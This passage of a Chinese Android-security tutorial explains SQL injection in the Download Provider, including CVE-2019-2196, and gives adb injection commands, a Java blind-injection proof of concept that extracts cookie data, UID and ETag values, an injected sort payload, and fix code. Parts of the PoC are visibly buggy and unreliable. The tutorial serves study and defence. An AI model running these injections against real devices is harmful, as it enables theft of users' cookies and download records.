+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell content query <span class="comment">--uri content://downloads/public_downloads/0 -- where &quot;1=1) AND (_id=1 AND cookiedata LIKE &#x27;a%&#x27;) OR (1=1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以从request_headers表转储所有内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell content query <span class="comment">--uri content://downloads/public_downloads/0 -- where &quot;1=1) AND (SELECT header FROM request_headers WHERE _id=1) LIKE &#x27;a%&#x27; OR (1=1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>还可以使用盲SQL注入（如果启用此选项，则过程将稍微慢一些）来包含受限列，如UID、ETAG或CookieData</p>
+<h4 id="（2）漏洞复现-3"><a href="#（2）漏洞复现-3" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>首先我们需要从google上下载一些数据</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/39.png" alt="image-20220710194802806"></p>
+<p>这里没有合适的案例，就不进行演示了</p>
+<p>然后我们编写Poc:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dump</span><span class="params">(<span class="type">boolean</span> dumpProtectedColumns)</span> &#123;</span><br><span class="line">       <span class="type">ContentResolver</span> <span class="variable">res</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line">       <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://downloads/public_downloads/#&quot;</span>);</span><br><span class="line">       <span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;ERROR: The device does not appear to be vulnerable1&quot;</span>);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">//这里可以替换我们的sql注入构造语句</span></span><br><span class="line">           cur = res.query(uri, <span class="literal">null</span>, <span class="string">&quot;1=1) OR (1=1&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">           Log.e(<span class="string">&quot;WindXaa&quot;</span>, <span class="string">&quot;Error&quot;</span>, e);</span><br><span class="line">           Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;ERROR: The device does not appear to be vulnerable&quot;</span>);</span><br><span class="line">           <span class="comment">//return;</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (cur != <span class="literal">null</span> || cur.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="comment">// Iterate all results and display some fields for each row from the downloads database</span></span><br><span class="line">               <span class="keyword">while</span> (cur.moveToNext()) &#123;</span><br><span class="line">                   <span class="type">int</span> <span class="variable">rowId</span> <span class="operator">=</span> cur.getInt(cur.getColumnIndex(<span class="string">&quot;_id&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">rowData</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;_data&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">rowUri</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;uri&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">rowTitle</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;title&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">rowDescription</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;description&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                   <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(string);</span><br><span class="line">                   sb.append(<span class="string">&quot;DOWNLOAD ID &quot;</span>).append(rowId);</span><br><span class="line">                   sb.append(<span class="string">&quot;\nData: &quot;</span>).append(rowData);</span><br><span class="line">                   sb.append(<span class="string">&quot;\nUri: &quot;</span>).append(rowUri);</span><br><span class="line">                   sb.append(<span class="string">&quot;\nTitle: &quot;</span>).append(rowTitle);</span><br><span class="line">                   sb.append(<span class="string">&quot;\nDescription: &quot;</span>).append(rowDescription);</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">if</span> (dumpProtectedColumns) &#123;</span><br><span class="line">                       <span class="type">int</span> <span class="variable">uid</span> <span class="operator">=</span> binarySearch(rowId, <span class="string">&quot;uid&quot;</span>);</span><br><span class="line">                       sb.append(<span class="string">&quot;\nUID: &quot;</span>).append(uid);</span><br><span class="line"></span><br><span class="line">                       dumpColumn(rowId, <span class="string">&quot;CookieData&quot;</span>, sb);</span><br><span class="line">                       dumpColumn(rowId, <span class="string">&quot;ETag&quot;</span>, sb);</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                   Log.w(<span class="string">&quot;WindXaa&quot;</span>,sb.toString());</span><br><span class="line">               &#125;</span><br><span class="line">               Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;\n\nDUMP FINISHED&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">               cur.close();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dumpColumn</span><span class="params">(<span class="type">int</span> rowId, String columnName, StringBuilder sb)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (isTrueCondition(rowId, <span class="string">&quot;length(&quot;</span> + columnName + <span class="string">&quot;) &gt; 0&quot;</span>)) &#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> binarySearch(rowId, <span class="string">&quot;length(&quot;</span> + columnName + <span class="string">&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">           sb.append(<span class="string">&quot;\n&quot;</span> + columnName + <span class="string">&quot;: &quot;</span>);</span><br><span class="line">           <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">               <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> binarySearch(rowId, <span class="string">&quot;unicode(substr(&quot;</span> + columnName + <span class="string">&quot;,&quot;</span> + i + <span class="string">&quot;,1))&quot;</span>);</span><br><span class="line">               <span class="type">String</span> <span class="variable">newChar</span> <span class="operator">=</span> Character.toString((<span class="type">char</span>) c);</span><br><span class="line">               sb.append(newChar);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span> id, String sqlExpression)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">20000</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span> (min + <span class="number">1</span> &lt; max) &#123;</span><br><span class="line">           mid = (<span class="type">int</span>) Math.floor((<span class="type">double</span>) (max + min) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (isTrueCondition(id, sqlExpression + <span class="string">&quot;&gt;&quot;</span> + mid))</span><br><span class="line">               min = mid;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">               max = mid;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ((mid == max) &amp;&amp; isTrueCondition(id, sqlExpression + <span class="string">&quot;=&quot;</span> + mid))</span><br><span class="line">           <span class="keyword">return</span> mid;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> (isTrueCondition(id, sqlExpression + <span class="string">&quot;=&quot;</span> + (mid + <span class="number">1</span>))) <span class="comment">// Extra check</span></span><br><span class="line">           <span class="keyword">return</span> mid + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isTrueCondition</span><span class="params">(<span class="type">int</span> rowId, String sqlCondition)</span> &#123;</span><br><span class="line">       <span class="type">ContentResolver</span> <span class="variable">res</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line">       <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://downloads/public_downloads/0&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> res.query(uri, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;_id&quot;</span>&#125;, <span class="string">&quot;_id=&quot;</span> + rowId + <span class="string">&quot;) and (&quot;</span> +</span><br><span class="line">               sqlCondition + <span class="string">&quot;) or (1=1&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> (cur != <span class="literal">null</span> &amp;&amp; cur.getCount() &gt; <span class="number">0</span>);</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">               cur.close();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>预期效果显示（这里由于没找到合适案例，使用官方图片展示效果）：</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/40.png" alt="image-20220710195237128"></p>
+<h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果它没有破坏任何功能，请考虑添加被删除的行：</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">query</span><span class="params">(<span class="keyword">final</span> Uri uri, String[] projection,</span></span><br><span class="line"><span class="params">    <span class="keyword">final</span> String selection, <span class="keyword">final</span> String[] selectionArgs,</span></span><br><span class="line"><span class="params">    <span class="keyword">final</span> String sort)</span> &#123;</span><br><span class="line">	Helpers.validateSelection(selection, sAppReadableColumnsSet);</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Android-Download-Provider上的SQL注入——sort参数（CVE-2019-2196）"><a href="#2-Android-Download-Provider上的SQL注入——sort参数（CVE-2019-2196）" class="headerlink" title="2.Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）"></a>2.Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）</h3><h4 id="（1）漏洞原理-4"><a href="#（1）漏洞原理-4" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>同样是针对Download Provider，因为被授予<code>android.permission.INTERNET</code>权限的恶意应用可以在<code>query()</code>方法的<code>sort</code>参数（<code>ORDER BY</code>子句）中附加一个包含子查询语句的<code>LIMIT</code>子句，实施SQL注入攻击，从而检索Download Provider内部数据库的所有条目。</p>
+<h4 id="（2）漏洞复现-4"><a href="#（2）漏洞复现-4" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>可以构造sql注入语句：</p>
+<p><code>sort</code>参数传入的值是<code>ORDER BY</code>子句后拼接的内容，为了利用此漏洞，可以在<code>sort</code>参数处构造：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">columnName</span><br><span class="line">limit</span><br><span class="line"><span class="keyword">case</span> <span class="title function_">when</span> <span class="params">(condition)</span> then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end</span><br><span class="line">例如：</span><br><span class="line">_id limit <span class="keyword">case</span> <span class="title function_">when</span><span class="params">(</span></span><br><span class="line"><span class="params">    (select count(*)</span> from downloads)&gt;<span class="number">0</span></span><br><span class="line">)</span><br><span class="line">then <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> end</span><br></pre></td></tr></table></figure>
+
+<p>这里详细的复现过程可以参考文章：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/367365614">Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）</a></p>
+<h4 id="（3）安全防护-1"><a href="#（3）安全防护-1" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>确保执行数据库操作前合理校验query()方法的sort参数。例如，确保sort参数不包含注入了LIMIT子句和潜在的恶意子查询语句的恶意payload，或者执行更严格的校验，比如要求参数仅包含以逗号分隔的现有数据列列表和字符串“asc”或“desc”。</p>
+<p>DownloadProvider.java文件添加代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(<span class="keyword">final</span> Uri uri, String[] projection,</span></span><br><span class="line"><span class="params">         <span class="keyword">final</span> String selection, <span class="keyword">final</span> String[] selectionArgs,</span></span><br><span class="line"><span class="params">         <span class="keyword">final</span> String sort)</span> &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (shouldRestrictVisibility()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sort != <span class="literal">null</span> &amp;&amp; sort.toLowerCase(Locale.ENGLISH).contains(<span class="string">&quot;limit&quot;</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;invalid sort&quot;</span>);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>本文通过总结和学习，初步的将讲解了Android平台APP上的常见的Sql注入的方式，并使用一些案例进行了一一的列举，文中一部分漏洞没有找到合适的案例，大家可以参考对应作者的博客，后续相关的实验材料上传github和知识星球</p>
+<p>github网址：<a target="_blank" rel="noopener" href="https://github.com/WindXaa/Android-Vulnerability-Mining">WindXaa</a></p>
+<h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><p>sql注入漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/li-xin-yi/SQL-inject-demo</span><br><span class="line">https://security-summer-labs.readthedocs.io/en/latest/lab8/readme.html#task-1-sql-injection-attack-on-select-statement</span><br><span class="line">https://chowdera.com/2022/02/202202060538187242.html</span><br><span class="line">https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/</span><br><span class="line">https://cloud.tencent.com/developer/article/1580824</span><br></pre></td></tr></table></figure>
+
+<p>DownLoad Provider漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://zhuanlan.zhihu.com/p/367365614</span><br><span class="line">https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</span><br><span class="line">https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>安全后厨团队 |  微信公众号【安全后厨】
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://security-kitchen.com/2023/02/14/bug0018/" title="Android App漏洞之战（18）——Sql漏洞初探">http://security-kitchen.com/2023/02/14/bug0018/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag"># 漏洞挖掘</a>
+              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/14/bug0017/" rel="prev" title="Android App漏洞之战（17）——验证码漏洞挖掘详解">
+      <i class="fa fa-chevron-left"></i> Android App漏洞之战（17）——验证码漏洞挖掘详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/02/14/bug0019/" rel="next" title="Android App漏洞之战（19）——插件化漏洞与解压缩漏洞详解">
+      Android App漏洞之战（19）——插件化漏洞与解压缩漏洞详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81SQL%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D"><span class="nav-text">二、SQL漏洞原理介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-text">1.SQL注入原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="nav-text">2.SQL注入分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-text">（1）联合查询注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">（2）报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-text">（3）布尔盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">（4）时间盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-SQL%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7"><span class="nav-text">3.SQL常见注入技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E9%87%8D%E8%A8%80%E5%BC%8F%E6%94%BB%E5%87%BB"><span class="nav-text">（1）重言式攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89Piggy-backed%E6%9F%A5%E8%AF%A2"><span class="nav-text">（2）Piggy-backed查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF"><span class="nav-text">（3）逻辑错误</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-text">（4）联合查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%885%EF%BC%89%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">（5）存储过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%886%EF%BC%89%E6%8E%A8%E6%96%AD%E6%94%BB%E5%87%BB"><span class="nav-text">（6）推断攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-1-gt-%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="nav-text">&lt;1&gt;盲注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-2-gt-%E5%AE%9A%E6%97%B6%E6%94%BB%E5%87%BB"><span class="nav-text">&lt;2&gt;定时攻击</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%887%EF%BC%89%E4%BA%A4%E6%9B%BF%E7%BC%96%E7%A0%81"><span class="nav-text">（7）交替编码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Andorid-APP-SQL%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B5%8B%E8%AF%95%E7%82%B9"><span class="nav-text">4.Andorid APP SQL漏洞常见的测试点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84SQL%E6%BC%8F%E6%B4%9E"><span class="nav-text">三、常见的SQL漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%87%8D%E8%A8%80%E5%BC%8F%E6%94%BB%E5%87%BB"><span class="nav-text">1.重言式攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">（1）漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">（2）漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Piggy-backed%E6%9F%A5%E8%AF%A2"><span class="nav-text">2.Piggy-backed查询</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="nav-text">（1）漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-text">（2）漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E6%94%BB%E5%87%BB"><span class="nav-text">3.逻辑错误攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="nav-text">（1）漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="nav-text">（2）漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF"><span class="nav-text">4.漏洞的挖掘思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="nav-text">5.安全防护</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Content-Provider%E4%B8%8ASql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">四、Content Provider上Sql注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">1.漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="nav-text">2.漏洞检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">3.漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="nav-text">4.安全防护</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81Android-Download-Provider%E4%B8%8Asql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">五、Android Download Provider上sql注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" 